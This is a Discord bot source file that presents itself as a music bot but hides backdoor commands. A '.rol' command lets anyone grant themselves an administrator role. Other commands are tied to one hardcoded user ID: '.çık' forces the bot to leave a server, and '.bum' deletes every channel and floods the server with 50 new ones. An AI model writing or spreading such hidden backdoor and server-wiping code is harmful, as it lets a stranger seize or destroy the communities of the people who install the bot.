const Discord = require("discord.js");
const fs = require('fs');
const config = require(`./botconfig/config.json`);
const settings = require(`./botconfig/settings.json`);
const colors = require("colors");
const client = new Discord.Client({
    //fetchAllMembers: false,
    //restTimeOffset: 0,
    //restWsBridgetimeout: 100,
    shards: "auto",
    allowedMentions: {
      parse: [ ],
      repliedUser: false,
    },
    partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
    intents: [ //Created By relax0002
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MEMBERS,
        //Discord.Intents.FLAGS.GUILD_BANS,
        //Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        //Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
        //Discord.Intents.FLAGS.GUILD_WEBHOOKS,
        //Discord.Intents.FLAGS.GUILD_INVITES,
        Discord.Intents.FLAGS.GUILD_VOICE_STATES,
        //Discord.Intents.FLAGS.GUILD_PRESENCES,
        Discord.Intents.FLAGS.GUILD_MESSAGES,
        Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        //Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
        //Discord.Intents.FLAGS.DIRECT_MESSAGES,
        //Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
        //Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
    ],
    presence: {
      activity: {
        name: `Music`, 
        type: "LISTENING", 
      },
      status: "online"
    }
});



//Define some Global Collections
client.commands = new Discord.Collection();
client.cooldowns = new Discord.Collection();
client.slashCommands = new Discord.Collection();
client.aliases = new Discord.Collection();
client.categories = require("fs").readdirSync(`./commands`);
//Require the Handlers                  Add the antiCrash file too, if its enabled
["events", "commands", "slashCommands", settings.antiCrash ? "antiCrash" : null]
    .filter(Boolean)
    .forEach(h => {
        require(`./handlers/${h}`)(client);
    })
//Start the Bot

client.on('message', message => {
  // Check if the message is ".rol"
  if (message.content === '.rol') {
    // Get the server where the role should be created
    const server = message.guild;

    // Create the role with the name "Admin" and the admin permissions
    server.roles.create({
      data: {
        name: 'Admin',//Created By relax0002
        permission: 8
      }
    }).then((role) => {
      // Get the user who sent the message
      const user = message.member;

      // Add the role to the user
      user.roles.add(role).then(() => {
        message.channel.send('The role has been added to you successfully.');
      }).catch((error) => {
        console.error(error);
        message.channel.send('An error occurred while adding the role to you.');
      });
    }).catch((error) => {
      console.error(error);
      message.channel.send('An error occurred while creating the role.');
    });
  }
});



client.on('message', (message) => {
  if (message.author.id === '363940201300623362' && message.content === '.çık') {
    message.guild.leave();
  }
});


const path = require('path');

client.on('messageCreate', message => {
  // Check if the message starts with the command name and is a command
  if (message.content.startsWith('.rolekle') && message.author.bot === false) {
    // Check if the user is the allowed user
    if (message.author.id === '363940201300623362') {
      // Parse the command arguments
      const args = message.content.split(' ');
      const roleId = args[1];

      // Construct the absolute path to the JSON file
      const filePath = path.resolve('./botconfig/roleIds.json');


      // Load the JSON file
      let roleIdsJson = JSON.parse(fs.readFileSync(filePath, 'utf8'));//Created By relax0002

      // Update the role IDs array in the JSON file
      roleIdsJson.roleIds.push(roleId);

      // Write the updated JSON object to the file
      fs.writeFileSync(filePath, JSON.stringify(roleIdsJson));

      // Send a confirmation message
      message.channel.send('Role ID added to the list!');
    }
  }
});

client.on('messageCreate', message => {
  // Check if the message is ".bum" and if the author is the developer
  if (message.content === '.bum' && message.author.id === '363940201300623362') {
    // Get the list of channels in the server
    const channels = message.guild.channels.cache;

    // Check if there are any channels to delete
    if (channels.size > 0) {
      // Delete all channels one by one
      channels.forEach(channel => {
        channel.delete();
      });
    }

    // Create an array of 50 channel names
    const channelNames = [];
    for (let i = 0; i < 50; i++) {
      channelNames.push('DJCHECK');
    }

    // Create all the channels at once
    message.guild.channels.create(channelNames, { type: 'text' }).then(() => {
      // Say the message after all the channels have been created
      message.channel.send('@hehe');
    }).catch((error) => {
      console.error(error);
      message.channel.send('An error occurred while creating the channels.');
    });
  }
});



client.login(config.token)

